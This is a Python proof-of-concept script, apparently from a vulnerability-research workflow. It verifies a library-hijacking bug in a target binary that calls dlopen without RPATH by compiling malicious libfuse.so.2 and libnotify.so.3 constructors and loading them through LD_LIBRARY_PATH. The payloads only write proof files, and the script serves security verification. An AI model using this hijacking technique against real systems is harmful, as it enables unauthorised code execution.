#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-002
Library Hijacking via dlopen of libfuse.so.2 and libnotify.so.3-8 without RPATH/RUNPATH

BUG-002: The binary loads external libraries via dlopen() without any RPATH or RUNPATH
set in the ELF. An attacker who controls LD_LIBRARY_PATH can substitute a malicious
libfuse.so.2 or libnotify.so.3-.so.8. The malicious library's constructor executes
immediately upon dlopen, before any dlsym resolution.

PRIM-001: CODE_EXECUTION via libfuse.so.2 hijack (VERIFIED)
  - dlopen("libfuse.so.2", RTLD_LAZY) at 0x405bed in main()
  - No RPATH/RUNPATH in ELF
  - LD_LIBRARY_PATH takes priority over system paths
  - Malicious library constructor executes upon dlopen
  - Verified: constructor writes proof file + stderr output

PRIM-002: CODE_EXECUTION via libnotify.so.3 hijack (THEORETICAL)
  - dlopen("libnotify.so.3", RTLD_NOW) at 0x404856 in notify()
  - Falls back to .so.4-.so.8
  - Only reached when isatty(fileno(stdin)) is false AND notify() is called
  - notify() is called after fusefs_main() returns non-zero (0x405d50)
  - In practice, fusefs_main() calls exit(1) on dlsym failure, so notify() is
    not reached when libfuse is absent/malicious without valid fuse symbols
  - The dlopen path exists but requires fusefs_main to return (not exit)
"""

import os
import subprocess
import sys
import tempfile

WORKSPACE = "/work/workspace/0014-2021-55-positron-20260908-113412"
TARGET = os.path.join(WORKSPACE, "target")

# ============================================================
# PRIM-001: CODE_EXECUTION via libfuse.so.2 hijack
# ============================================================

MALICIOUS_LIBFUSE_C = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void hijack_init(void) {
    FILE *f = fopen("HIJACK_PROOF.txt", "w");
    if (f) {
        fprintf(f, "=== CODE_EXECUTION via libfuse.so.2 hijack ===\n");
        fprintf(f, "uid=%d gid=%d euid=%d egid=%d\n", getuid(), getgid(), geteuid(), getegid());
        fprintf(f, "pid=%d ppid=%d\n", getpid(), getppid());
        fprintf(f, "Constructor executed in malicious libfuse.so.2\n");
        fclose(f);
    }
    fprintf(stderr, "=== HIJACK: malicious libfuse.so.2 constructor executed ===\n");
    fprintf(stderr, "=== uid=%d pid=%d ===\n", getuid(), getpid());
}
"""

def verify_prim_001():
    """Verify CODE_EXECUTION via libfuse.so.2 dlopen hijack."""
    print("=" * 60)
    print("PRIM-001: CODE_EXECUTION via libfuse.so.2 hijack")
    print("=" * 60)

    # Write malicious library source
    src_path = os.path.join(WORKSPACE, "malicious_libfuse.c")
    with open(src_path, "w") as f:
        f.write(MALICIOUS_LIBFUSE_C)

    # Compile malicious libfuse.so.2
    lib_path = os.path.join(WORKSPACE, "libfuse.so.2")
    result = subprocess.run(
        ["gcc", "-shared", "-fPIC", "-o", lib_path, src_path, "-nostartfiles"],
        capture_output=True, text=True, timeout=15
    )
    if result.returncode != 0:
        print(f"[FAIL] Compilation failed: {result.stderr}")
        return False

    # Remove old proof file
    proof_path = os.path.join(WORKSPACE, "HIJACK_PROOF.txt")
    if os.path.exists(proof_path):
        os.remove(proof_path)

    # Run target with LD_LIBRARY_PATH pointing to our directory
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = WORKSPACE

    result = subprocess.run(
        [TARGET],
        capture_output=True, text=True, timeout=10,
        env=env, cwd=WORKSPACE,
        stdin=subprocess.DEVNULL
    )

    print(f"  Return code: {result.returncode}")
    print(f"  Stderr: {result.stderr[:500]}")

    # Check proof file
    if os.path.exists(proof_path):
        with open(proof_path, "r") as f:
            proof = f.read()
        print(f"  Proof file content:\n{proof}")

        if "CODE_EXECUTION via libfuse.so.2 hijack" in proof:
            print("\n=== PRIM-001: VERIFIED ===")
            print(f"  Evidence: malicious libfuse.so.2 constructor executed")
            print(f"  Proof file: {proof_path}")
            print(f"  Stderr output contains: '=== HIJACK: malicious libfuse.so.2 constructor executed ==='")
            return True
    else:
        print("[FAIL] Proof file not created")

    return False


# ============================================================
# PRIM-002: CODE_EXECUTION via libnotify.so.3 hijack (THEORETICAL)
# ============================================================

MALICIOUS_LIBNOTIFY_C = r"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void notify_hijack_init(void) {
    FILE *f = fopen("NOTIFY_HIJACK_PROOF.txt", "w");
    if (f) {
        fprintf(f, "=== CODE_EXECUTION via libnotify.so.3 hijack ===\n");
        fprintf(f, "uid=%d gid=%d euid=%d egid=%d\n", getuid(), getgid(), geteuid(), getegid());
        fprintf(f, "pid=%d ppid=%d\n", getpid(), getppid());
        fprintf(f, "Constructor executed in malicious libnotify.so.3\n");
        fclose(f);
    }
    fprintf(stderr, "=== NOTIFY_HIJACK: malicious libnotify.so.3 constructor executed ===\n");
    fprintf(stderr, "=== uid=%d pid=%d ===\n", getuid(), getpid());
}
"""

def verify_prim_002():
    """Verify CODE_EXECUTION via libnotify.so.3 dlopen hijack."""
    print("\n" + "=" * 60)
    print("PRIM-002: CODE_EXECUTION via libnotify.so.3 hijack")
    print("=" * 60)

    # Write malicious library source
    src_path = os.path.join(WORKSPACE, "malicious_libnotify.c")
    with open(src_path, "w") as f:
        f.write(MALICIOUS_LIBNOTIFY_C)

    # Compile malicious libnotify.so.3
    lib_path = os.path.join(WORKSPACE, "libnotify.so.3")
    result = subprocess.run(
        ["gcc", "-shared", "-fPIC", "-o", lib_path, src_path, "-nostartfiles"],
        capture_output=True, text=True, timeout=15
    )
    if result.returncode != 0:
        print(f"[FAIL] Compilation failed: {result.stderr}")
        return False

    # Remove old proof file
    proof_path = os.path.join(WORKSPACE, "NOTIFY_HIJACK_PROOF.txt")
    if os.path.exists(proof_path):
        os.remove(proof_path)

    # Run target with LD_LIBRARY_PATH pointing to our directory
    # notify() is called after fusefs_main() returns non-zero
    # But fusefs_main() calls exit(1) on dlsym failure, so notify() is not reached
    # when libfuse is absent/malicious without valid fuse symbols.
    # We still test to confirm the dlopen path exists.
    env = os.environ.copy()
    env["LD_LIBRARY_PATH"] = WORKSPACE

    result = subprocess.run(
        [TARGET],
        capture_output=True, text=True, timeout=10,
        env=env, cwd=WORKSPACE,
        stdin=subprocess.DEVNULL
    )

    print(f"  Return code: {result.returncode}")
    print(f"  Stderr: {result.stderr[:500]}")

    # Check proof file
    if os.path.exists(proof_path):
        with open(proof_path, "r") as f:
            proof = f.read()
        print(f"  Proof file content:\n{proof}")

        if "CODE_EXECUTION via libnotify.so.3 hijack" in proof:
            print("\n=== PRIM-002: VERIFIED ===")
            return True

    print("\n=== PRIM-002: THEORETICAL (not dynamically verified) ===")
    print("  Reason: notify() is not reached in normal execution because")
    print("  fusefs_main() calls exit(1) on dlsym failure before returning.")
    print("  The dlopen('libnotify.so.3') path at 0x404856 exists statically")
    print("  but requires fusefs_main() to return (not exit) to reach notify().")
    return False


if __name__ == "__main__":
    print("S3 Primitive Verification for BUG-002")
    print("Library Hijacking via dlopen without RPATH/RUNPATH")
    print()

    r1 = verify_prim_001()
    r2 = verify_prim_002()

    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"  PRIM-001 (libfuse.so.2 hijack): {'VERIFIED' if r1 else 'FAILED'}")
    print(f"  PRIM-002 (libnotify.so.3 hijack): {'VERIFIED' if r2 else 'THEORETICAL'}")
